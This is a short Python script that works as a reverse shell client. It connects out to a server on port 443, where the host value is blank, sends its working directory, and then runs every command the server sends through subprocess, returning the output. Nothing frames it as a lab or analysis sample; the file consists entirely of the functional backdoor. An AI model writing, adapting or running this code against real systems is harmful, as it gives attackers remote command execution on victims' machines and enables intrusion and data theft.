import socket
import os
import subprocess
#import sys

def target():
    SERVER_HOST = ""
    SERVER_PORT = 443
    BUFFER_SIZE = 1024 * 128
    SEPARATOR = "<sep>"

    s = socket.socket()
    s.connect((SERVER_HOST, SERVER_PORT))

    # get current directory
    cwd = os.getcwd()
    s.send(cwd.encode())

    while True:
        command = s.recv(BUFFER_SIZE).decode("utf-8")
        #splited_command = command.split()
        
        if command.lower() == "exit":
            break
        else:
            output = subprocess.getoutput(command)
        
        # get current directory
        cwd = os.getcwd()
        # send the results back to the server
        message = f"{output}{SEPARATOR}{cwd}"
        s.send(message.encode("utf-8"))
    s.close()

if __name__ == '__main__':
    target()